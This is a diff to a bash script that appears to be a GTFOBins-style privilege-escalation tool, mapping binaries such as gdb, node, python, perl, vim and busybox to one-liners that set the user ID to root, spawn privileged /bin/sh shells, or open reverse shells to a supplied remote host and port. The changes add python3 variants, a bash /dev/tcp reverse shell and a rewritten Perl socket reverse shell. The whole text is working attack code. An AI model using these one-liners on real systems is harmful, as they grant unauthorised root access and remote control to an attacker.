@@ -123,7 +123,7 @@ function modes() {
         case $(basename "${binary#sudo }") in
             gdb) $binary -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit ;;
             node) $binary -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' ;;
-            python) $binary -c 'import os; os.setuid(0); os.system("/bin/sh")' ;;
+            python|python3) $binary -c 'import os; os.setuid(0); os.system("/bin/sh")' ;;
             php)
                 CMD="/bin/sh"
                 $binary -r "posix_setuid(0); system('$CMD');" ;;
@@ -174,11 +174,15 @@ function modes() {
     elif [[ $mode == "rev_shell" || $mode == "reverse_shell" || $mode == "shell" || $mode == "revshell" ]]; then
         case $(basename "${binary#sudo }") in
             busybox) $binary nc -e /bin/sh "$rhost" "$rport" ;;
+            bash) 
+                export RHOST="$rhost"
+                export RPORT="$rport"
+                $binary -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1' ;;
             nc) $binary -e /bin/sh "$rhost" "$rport" ;;
             perl) 
                 export RHOST="$rhost"
                 export RPORT="$rport"
-                $binary -e 'use Socket;use IO::Socket::INET;$i=$ENV{"RHOST"};$p=$ENV{"RPORT"};$socket=new IO::Socket::INET(PeerAddr=>$i,PeerPort=>$p,Proto=>"tcp") or die "Erro ao conectar: $!\n";open(STDIN, ">&$socket");open(STDOUT, ">&$socket");open(STDERR, ">&$socket");exec("/bin/sh -i") or die "Erro ao executar shell: $!\n";' ;;
+                $binary -e 'use Socket;$i=$ENV{"RHOST"};$p=$ENV{"RPORT"};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};' ;;
             php)
                 export RHOST="$rhost"
                 export RPORT="$rport"
@@ -230,7 +234,7 @@ function modes() {
             pexec) $binary /bin/sh -p ;;
             csh) $binary -b ;;
             dash) $binary -p ;;
-            python) $binary -c 'import os; os.execl("/bin/sh", "sh", "-p")' ;;
+            python|python3) $binary -c 'import os; os.execl("/bin/sh", "sh", "-p")' ;;
             env) $binary /bin/sh -p ;;
             expect) $binary -c 'spawn /bin/sh -p;interact' ;;
             vim) $binary -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
